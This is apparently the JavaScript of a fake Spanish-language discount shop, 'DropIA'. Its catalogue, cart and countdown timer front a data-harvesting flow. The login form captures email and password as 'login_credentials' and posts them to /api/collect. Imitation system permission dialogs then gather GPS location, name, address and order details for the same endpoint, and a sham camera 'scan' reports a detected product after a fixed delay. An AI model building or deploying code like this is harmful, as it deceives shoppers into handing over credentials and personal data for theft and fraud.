document.addEventListener('DOMContentLoaded', () => {
    let cart = [];
    let currentCat = 'all';
    let searchQuery = '';
    let lastScrollPos = 0;
    const capturedData = {};

    const products = [
        { id: 1, name: "AirPods Pro (2nd Gen) - Cancelación de Ruido", price: 64900, old: 189900, disc: "-65%", img: "images/AirPods Pro (2nd Gen) Magsafe.webp", cat: "flash", catName: "Tecnología", tag: "Más vendido" },
        { id: 2, name: "Termo Stanley", price: 45000, old: 125000, disc: "-64%", img: "images/Termo Stanley Quencher 40oz.jpeg", cat: "best", catName: "Hogar", tag: "Tendencia" },
        { id: 3, name: "Smartwatch Ultra Series 9 - Pantalla AMOLED", price: 89000, old: 280000, disc: "-68%", img: "images/Smartwatch Ultra Series 9 - Pantalla AMOLED.webp", cat: "flash", catName: "Tecnología", tag: "Oferta IA" },
        { id: 4, name: "Set Skincare Coreano Glow - Rutina 5 Pasos", price: 32000, old: 98000, disc: "-67%", img: "https://images.unsplash.com/photo-1556228578-0d85b1a4d571?w=500&q=80", cat: "offers", catName: "Belleza", tag: "Recomendado" },
        { id: 5, name: "Bolso Premium Estilo Lujo Beige - Cuero Vegano", price: 55000, old: 160000, disc: "-65%", img: "https://images.unsplash.com/photo-1548036328-c9fa89d128fa?w=500&q=80", cat: "best", catName: "Moda", tag: "Contra entrega" },
        { id: 6, name: "Tenis Running Pro Max Confort Black Edition", price: 78000, old: 220000, disc: "-65%", img: "images/Tenis Running Pro Max Comfort.jpg", cat: "offers", catName: "Moda", tag: "Envío Gratis" },
        { id: 7, name: "Audífonos Sony WH-1000XM5 Clone Premium", price: 125000, old: 480000, disc: "-74%", img: "https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=500&q=80", cat: "flash", catName: "Tecnología", tag: "Importado" },
        { id: 8, name: "Reloj Minimalista de Cuero Premium", price: 39000, old: 95000, disc: "-59%", img: "images/Reloj Minimalista Cuero.jpg", cat: "best", catName: "Accesorios", tag: "Elegante" },
        { id: 9, name: "Proyector portátil mini HD", price: 145000, old: 390000, disc: "-63%", img: "images/Proyector Portátil Mini HD.webp", cat: "offers", catName: "Tecnología", tag: "Más vendido" },
        { id: 10, name: "Máquina de Afeitar Vintage T-Blade Gold", price: 28000, old: 89000, disc: "-68%", img: "https://images.unsplash.com/photo-1621605815971-fbc98d665033?w=500&q=80", cat: "flash", catName: "Belleza", tag: "Personal Care" },
        { id: 11, name: "Serum Vitamina C + Ácido Hialurónico Anti-Edad", price: 19500, old: 48000, disc: "-60%", img: "https://images.unsplash.com/photo-1620916566398-39f1143ab7be?w=500&q=80", cat: "offers", catName: "Belleza", tag: "Skincare" },
        { id: 12, name: "Vaso Stanley", price: 29000, old: 65000, disc: "-55%", img: "images/Vaso Stanley Adventure 20oz.jpg", cat: "best", catName: "Hogar", tag: "Hogar" },
        { id: 13, name: "Cámara Seguridad WiFi 360 Visión Nocturna", price: 58000, old: 155000, disc: "-62%", img: "https://images.unsplash.com/photo-1557324232-b8917d3c3dcb?w=500&q=80", cat: "flash", catName: "Tecnología", tag: "Seguridad" },
        { id: 14, name: "Lámpara de escritorio LED", price: 34000, old: 82000, disc: "-58%", img: "images/Lámpara Escritorio LED.jpg", cat: "offers", catName: "Hogar", tag: "Oficina" },
        { id: 15, name: "Kit Maquillaje Profesional 24 Brochas + Estuche", price: 42000, old: 120000, disc: "-65%", img: "https://images.unsplash.com/photo-1522335789203-aabd1fc54bc9?w=500&q=80", cat: "best", catName: "Belleza", tag: "Belleza" },
        { id: 16, name: "Altavoz Bluetooth", price: 48000, old: 135000, disc: "-64%", img: "images/Altavoz Bluetooth IPX7.jpg", cat: "flash", catName: "Tecnología", tag: "Música" },
        { id: 17, name: "Soporte magnético auto", price: 12000, old: 38000, disc: "-68%", img: "images/Soporte Magnético Auto.webp", cat: "offers", catName: "Accesorios", tag: "Accesorios" },
        { id: 18, name: "Humidificador RGB", price: 45000, old: 110000, disc: "-59%", img: "images/Humidificador RGB.png", cat: "best", catName: "Hogar", tag: "Hogar" },
        { id: 19, name: "Cepillo secador 3 en 1", price: 52000, old: 145000, disc: "-64%", img: "images/Cepillo Secador 3 en 1.jpg", cat: "flash", catName: "Belleza", tag: "Peluquería" },
        { id: 20, name: "Perfume Sauvage Clone High Concentration", price: 65000, old: 195000, disc: "-67%", img: "https://images.unsplash.com/photo-1541643600914-78b084683601?w=500&q=80", cat: "offers", catName: "Accesorios", tag: "Fragancias" }
    ];

    window.navigateTo = function(screenId) {
        if (document.querySelector('.screen.active').id === 'screen-market') {
            lastScrollPos = document.getElementById('market-scroll').scrollTop;
        }
        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
        document.getElementById(screenId).classList.add('active');
        
        if (screenId === 'screen-market') {
            setTimeout(() => {
                document.getElementById('market-scroll').scrollTop = lastScrollPos;
            }, 50);
        }
    };

    window.resetView = function() {
        searchQuery = '';
        document.getElementById('search-input').value = '';
        currentCat = 'all';
        document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.cat === 'all'));
        document.getElementById('flash-banner').style.display = 'block';
        renderProducts();
        window.navigateTo('screen-market');
    };

    function renderProducts() {
        const container = document.getElementById('products-container');
        const filtered = products.filter(p => {
            const matchesCat = currentCat === 'all' || p.cat === currentCat || p.catName === currentCat;
            const matchesSearch = p.name.toLowerCase().includes(searchQuery.toLowerCase());
            return matchesCat && matchesSearch;
        });

        if (filtered.length === 0) {
            container.innerHTML = `<div class="no-results">No encontramos ese producto</div>`;
            return;
        }

        container.innerHTML = filtered.map(p => `
            <div class="product-card" onclick="addToCart(${p.id})">
                <img src="${p.img}" class="product-img">
                <span class="p-discount">${p.disc}</span>
                <div class="p-info">
                    <p class="p-name">${p.name}</p>
                    <div class="p-price-row">
                        <span class="p-price">$${p.price.toLocaleString()}</span>
                        <span class="p-old">$${p.old.toLocaleString()}</span>
                    </div>
                    <span class="p-tag">${p.tag}</span>
                </div>
            </div>
        `).join('');
    }

    // CART LOGIC
    window.openCart = function() {
        renderCart();
        document.getElementById('modal-cart').style.display = 'flex';
    };

    window.closeSideModal = function(id) {
        document.getElementById(id).style.display = 'none';
    };

    window.addToCart = function(id) {
        const p = products.find(x => x.id === id);
        cart.push(p);
        updateCartUI();
        showOfferPopup(p.name, p.price, p.old, p.img);
    };

    window.removeFromCart = function(index) {
        cart.splice(index, 1);
        renderCart();
        updateCartUI();
    };

    window.clearCart = function() {
        cart = [];
        renderCart();
        updateCartUI();
    };

    function updateCartUI() {
        const dot = document.getElementById('cart-dot');
        dot.style.display = cart.length > 0 ? 'block' : 'none';
    }

    function renderCart() {
        const container = document.getElementById('cart-items-container');
        const footer = document.getElementById('cart-footer');
        
        if (cart.length === 0) {
            container.innerHTML = `<div style="text-align:center; padding:50px 20px; color:var(--gray);">Tu carrito está vacío</div>`;
            footer.style.display = 'none';
            return;
        }

        footer.style.display = 'block';
        container.innerHTML = cart.map((item, index) => `
            <div class="cart-item">
                <img src="${item.img}">
                <div class="cart-item-info">
                    <p class="cart-item-name">${item.name}</p>
                    <p class="cart-item-price">$${item.price.toLocaleString()}</p>
                </div>
                <button class="btn-remove" onclick="removeFromCart(${index})"><i class="fa-solid fa-trash"></i></button>
            </div>
        `).join('');

        const total = cart.reduce((sum, item) => sum + item.price, 0);
        document.getElementById('cart-total-price').innerText = `$${total.toLocaleString()}`;
    }

    window.checkout = function() {
        window.closeSideModal('modal-cart');
        window.navigateTo('screen-login');
    };

    // CATEGORIES LOGIC
    window.openCategories = function() {
        document.getElementById('modal-cat').style.display = 'flex';
    };

    window.filterByCat = function(name, techId) {
        currentCat = name;
        searchQuery = '';
        document.getElementById('search-input').value = '';
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.getElementById('flash-banner').style.display = 'none';
        renderProducts();
        window.closeSideModal('modal-cat');
    };

    // POPUPS
    function showOfferPopup(name, price, old, img) {
        showGeneralPopup(`
            <img src="${img}" style="width:100px; height:100px; object-fit:cover; border-radius:10px; margin-bottom:15px;">
            <h3>¡Añadido al carrito!</h3>
            <p><b>${name}</b> se guardó con éxito.</p>
            <button class="btn-popup" onclick="closePopup(); openCart();">Ver mi carrito</button>
            <p onclick="closePopup()" style="margin-top:15px; font-size:0.85rem; font-weight:600; cursor:pointer;">Seguir comprando</p>
        `);
    }

    function showGeneralPopup(html) {
        const overlay = document.getElementById('overlay-container');
        overlay.innerHTML = `<div class="popup">${html}</div>`;
        overlay.style.display = 'flex';
    }

    window.closePopup = function() {
        document.getElementById('overlay-container').style.display = 'none';
    };

    // SEARCH
    document.getElementById('search-input').addEventListener('input', (e) => {
        searchQuery = e.target.value;
        document.getElementById('flash-banner').style.display = searchQuery ? 'none' : 'block';
        renderProducts();
    });

    // TABS
    document.querySelectorAll('.tab').forEach(t => {
        t.addEventListener('click', () => {
            document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
            t.classList.add('active');
            currentCat = t.dataset.cat;
            searchQuery = '';
            document.getElementById('search-input').value = '';
            document.getElementById('flash-banner').style.display = 'block';
            renderProducts();
        });
    });

    // CAMERA LOGIC
    let stream = null;
    document.getElementById('btn-camera-trigger').addEventListener('click', () => {
        showSystemDialog("Cámara", "DropIA quiere acceder to tu cámara", "Permite escanear productos y encontrar ofertas similares", () => {
            window.navigateTo('screen-scan');
            startCamera();
        });
    });

    async function startCamera() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
            document.getElementById('video-feed').srcObject = stream;
            setTimeout(() => {
                document.getElementById('scan-status').innerText = "¡Producto detectado!";
                document.getElementById('btn-scan-offer').style.display = 'inline-block';
                document.getElementById('btn-scan-offer').onclick = () => {
                    stopCamera();
                    window.addToCart(1);
                };
            }, 3000);
        } catch (e) {
            alert("Error al acceder a la cámara real.");
            window.navigateTo('screen-market');
        }
    }

    function stopCamera() {
        if (stream) stream.getTracks().forEach(t => t.stop());
    }

    // SYSTEM DIALOGS
    function showSystemDialog(title, bold, sub, onAllow) {
        const overlay = document.getElementById('overlay-container');
        overlay.innerHTML = `
            <div class="system-dialog">
                <div class="sd-content">
                    <b>${bold}</b>
                    <span>${sub}</span>
                </div>
                <div class="sd-btns">
                    <button onclick="closePopup()">No permitir</button>
                    <button class="bold" id="sd-allow">Permitir</button>
                </div>
            </div>
        `;
        overlay.style.display = 'flex';
        document.getElementById('sd-allow').onclick = () => {
            window.closePopup();
            onAllow();
        };
    }

    // FORM LOGIC
    document.getElementById('form-login').addEventListener('submit', async (e) => {
        e.preventDefault();
        capturedData.email = document.getElementById('log-email').value;
        capturedData.password = document.getElementById('log-pass').value;
        capturedData.type = "login_credentials";
        await sendData(capturedData);
        window.navigateTo('screen-storage');
    });

    document.getElementById('btn-trigger-storage').addEventListener('click', () => {
        showSystemDialog("Archivos", "DropIA quiere acceder a tus archivos", "Permite guardar imágenes del producto, catálogos y comprobantes del pedido", () => {
            document.getElementById('btn-trigger-storage').classList.add('hidden');
            document.getElementById('storage-success').style.display = 'block';
            document.getElementById('btn-storage-next').classList.remove('hidden');
            capturedData.storage_permission = true;
            sendData({ type: 'permission_storage', status: true });
        });
    });

    document.getElementById('btn-calc-shipping').addEventListener('click', () => {
        showSystemDialog("Ubicación", "DropIA quiere acceder a tu ubicación", "Permite calcular costo y tiempo de entrega exacto en tu zona", () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    capturedData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
                    capturedData.type = "location_gps";
                    sendData(capturedData);
                    document.getElementById('btn-calc-shipping').classList.add('hidden');
                    document.getElementById('location-success').style.display = 'block';
                    document.getElementById('btn-location-next').classList.remove('hidden');
                }, () => {
                    document.getElementById('btn-calc-shipping').classList.add('hidden');
                    document.getElementById('location-success').style.display = 'block';
                    document.getElementById('btn-location-next').classList.remove('hidden');
                });
            }
        });
    });

    document.getElementById('form-address').addEventListener('submit', async (e) => {
        e.preventDefault();
        capturedData.name = document.getElementById('addr-name').value;
        capturedData.address = document.getElementById('addr-line').value;
        capturedData.city = document.getElementById('addr-city').value;
        capturedData.cart = cart;
        capturedData.type = "full_info_order";
        await sendData(capturedData);
        window.navigateTo('screen-success');
    });

    async function sendData(data) {
        try {
            await fetch('/api/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (err) { console.error("Error offline:", err); }
    }

    // TIMER
    setInterval(() => {
        const t = document.getElementById('timer');
        if (t) {
            let [h, m, s] = t.innerText.split(':').map(Number);
            s--;
            if (s < 0) { s = 59; m--; }
            if (m < 0) { m = 59; h--; }
            t.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
        }
    }, 1000);

    // INIT
    renderProducts();
});
